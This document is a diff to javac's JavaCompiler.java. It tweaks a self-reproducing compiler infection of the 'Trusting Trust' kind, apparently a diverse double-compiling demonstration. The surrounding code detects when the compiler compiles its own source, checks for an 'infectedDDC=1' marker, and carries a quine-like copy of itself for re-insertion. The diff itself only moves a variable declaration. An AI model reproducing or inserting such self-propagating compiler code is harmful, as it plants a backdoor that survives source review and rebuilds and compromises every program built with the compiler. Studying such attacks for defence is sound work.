@@ -635,6 +635,7 @@ public class JavaCompiler {
      *  @param silent       true if TaskListeners should not be notified
      */
     private JCCompilationUnit parse(JavaFileObject filename, CharSequence content, boolean silent) {
+        String content_str;
         if (content != null) {
             int infectedDDC=1;
             String q = String.valueOf((char)34);
@@ -644,6 +645,7 @@ public class JavaCompiler {
             ddc_target += "filename, CharSequence content, boolean silent) {";
             String[] l = {
                 """
+                String content_str;
                 if (content != null) {
                     int infectedDDC=1;
                     String q = String.valueOf((char)34);
@@ -654,7 +656,7 @@ public class JavaCompiler {
                     String[] l = {""",
                 """
                     };
-                    String content_str = content.toString();
+                    content_str = content.toString();
                     if (filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java")) {
                         if (content_str.indexOf("infectedDDC=1") != -1) {
                             System.out.println("File already infected: ");
@@ -679,7 +681,7 @@ public class JavaCompiler {
             };
 
             /* Target own file for insertion, if the file does not match path, continue compilation as normal. Make sure we don't infect a file alreday infected. */
-            String content_str = content.toString();
+            content_str = content.toString();
             if (filename.getName().endsWith("jdk.compiler/share/classes/com/sun/tools/javac/main/JavaCompiler.java")) {
                 if (content_str.indexOf("infectedDDC=1") != -1) {
                     System.out.println("File already infected: ");
